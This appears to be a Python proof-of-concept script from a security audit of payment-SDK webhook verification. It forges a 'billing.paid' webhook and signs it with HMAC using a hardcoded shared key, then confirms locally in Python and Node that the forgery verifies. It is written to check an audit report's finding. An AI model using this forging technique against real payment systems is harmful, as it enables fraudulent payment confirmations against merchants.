#!/usr/bin/env python3
"""
Probe reproduzível de verificação de webhook em SDKs de pagamento.
Prova (100% local, nenhuma requisição ao servidor do alvo) que uma assinatura
forjada passa na verificação de SDKs que só validam a HMAC com chave pública.

Adaptar por alvo: SDKS (path dos repos clonados), PUBLIC_KEY (a chave hardcoded),
KEY_FILES (arquivos onde a chave deve aparecer) e SECRET_DIRS (SDK -> subdir de
código onde procurar o 2º fator, ex: 'meu-sdk/src').

Uso original: auditoria AbacatePay 29/09/2026 (Finding 1 — webhook forge).
Exit 0 = todas as afirmações do relatório conferem. Exit 1 = relatório precisa mudar.
"""
import hmac, hashlib, base64, json, subprocess, sys, os

SDKS = "/home/libertus/LIBERTUS/abacatepay-audit/sdks"
PUBLIC_KEY = "COLE_AQUI_A_CHAVE_HARDCODED_DO_ALVO"  # ex: os 200+ chars da @public_key

# arquivos onde a chave DEVE aparecer (prova de que é global/compartilhada)
KEY_FILES = [
    # "meu-sdk-elixir/lib/.../util.ex",
    # "meu-sdk-node/src/webhooks/signature.ts",
]
# SDK -> subdir de código (NÃO o repo inteiro, para não contar README/exemplos)
# SDK -> subdir de código (NÃO o repo inteiro, para não contar README/exemplos)
SECRET_DIRS = {
    # "sdk-vulneravel": "sdk-vulneravel",          # espera 0 checks de secret
    # "sdk-referencia": "sdk-referencia/lib",       # espera >0 checks de secret
}

fails = []

def key_in_file(relpath, needle=None):
    needle = needle or PUBLIC_KEY[:60]
    p = os.path.join(SDKS, relpath)
    if not os.path.exists(p):
        return None
    return needle in open(p, encoding="utf-8", errors="ignore").read()

for rel in KEY_FILES:
    r = key_in_file(rel)
    print(f"[chave hardcoded] {rel}: {'PRESENTE' if r else 'AUSENTE' if r is False else 'NAO EXISTE'}")
    if not r:
        fails.append(f"chave nao encontrada em {rel}")

# payload forjado de "pagamento confirmado"
forged = {"event": "billing.paid", "id": "webhook_forjado",
          "data": {"id": "bill_FAKE", "status": "PAID", "amount": 99900}}
raw = json.dumps(forged, separators=(",", ":")).encode()
forged_sig = base64.b64encode(hmac.new(PUBLIC_KEY.encode(), raw, hashlib.sha256).digest()).decode()
print(f"\nAssinatura forjada: {forged_sig}")

expected = base64.b64encode(hmac.new(PUBLIC_KEY.encode(), raw, hashlib.sha256).digest()).decode()
accepts = hmac.compare_digest(expected, forged_sig)
print(f"[verify HMAC-so   ] aceita forjado? {accepts}")
if not accepts:
    fails.append("HMAC-so nao aceitou (finding invalido)")

# verificação no runtime real (Node), quando disponível
node = subprocess.run(["bash", "-c", "command -v node"], capture_output=True, text=True)
if node.stdout.strip():
    js = f'''
const {{createHmac, timingSafeEqual}} = require('node:crypto');
const KEY = {json.dumps(PUBLIC_KEY)};
const raw = Buffer.from({json.dumps(raw.decode())}, 'utf8');
const sig = {json.dumps(forged_sig)};
const exp = createHmac('sha256', KEY).update(raw).digest('base64');
const A = Buffer.from(exp), B = Buffer.from(sig);
console.log(A.length===B.length && timingSafeEqual(A,B) ? 'REAL_NODE_ACCEPTS' : 'REAL_NODE_REJECTS');
'''
    r = subprocess.run(["node", "-e", js], capture_output=True, text=True)
    out = r.stdout.strip()
    print(f"[Node runtime REAL] {out or r.stderr.strip()}")
    if out != "REAL_NODE_ACCEPTS":
        fails.append("Node real nao aceitou")

def grep_secret(path):
    r = subprocess.run(["bash", "-c",
        f"grep -riE 'webhook_?secret|verify_secret' {SDKS}/{path} 2>/dev/null | grep -vi test | wc -l"],
        capture_output=True, text=True)
    return int(r.stdout.strip() or 0)

print()
for label, subdir in SECRET_DIRS.items():
    n = grep_secret(subdir)
    print(f"[secret checks] {label} ({subdir}) = {n}")

print("\n" + "=" * 55)
if fails:
    print("VERIFICACAO FALHOU — relatorio precisa de correcao:")
    for f in fails:
        print("  -", f)
    sys.exit(1)
print("VERIFICACAO OK: afirmacoes centrais conferem.")
